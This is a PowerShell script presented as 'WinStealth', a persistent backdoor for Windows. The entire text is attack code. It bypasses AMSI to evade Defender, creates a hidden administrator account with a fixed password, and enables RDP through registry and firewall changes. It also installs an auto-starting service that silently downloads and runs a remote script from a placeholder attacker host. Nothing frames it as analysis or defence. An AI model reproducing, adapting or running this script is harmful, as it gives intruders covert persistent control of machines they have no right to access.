# WinStealth - Persistent Service Backdoor for Windows
# Author: Phil Cali
# Description: Creates a hidden admin account, enables RDP, and sets up a reverse shell.

# AMSI Bypass (Windows Defender Bypass)
$A=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');
$B=$A.GetField('amsiInitFailed','NonPublic,Static');$B.SetValue($null,$true);

# Create a hidden admin user
$adminUser = "backdoor"
$adminPass = "P@ssw0rd123"

Write-Output "[+] Creating hidden admin user..."
net user $adminUser $adminPass /add
net localgroup administrators $adminUser /add
wmic useraccount where name='$adminUser' set Disabled=FALSE
wmic useraccount where name='$adminUser' set PasswordExpires=FALSE

# Enable RDP for future access
Write-Output "[+] Enabling RDP..."
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="Remote Desktop" new enable=Yes
net start TermService

# Create a persistent PowerShell reverse shell service
$payload = 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString(''http://attacker-ip/shell.ps1'')"'
$serviceName = "WinStealthService"

Write-Output "[+] Installing backdoor service..."
sc.exe create $serviceName binPath= "cmd.exe /c $payload" start= auto
sc.exe start $serviceName

Write-Output "[+] Backdoor installed. Access using RDP or reverse shell."
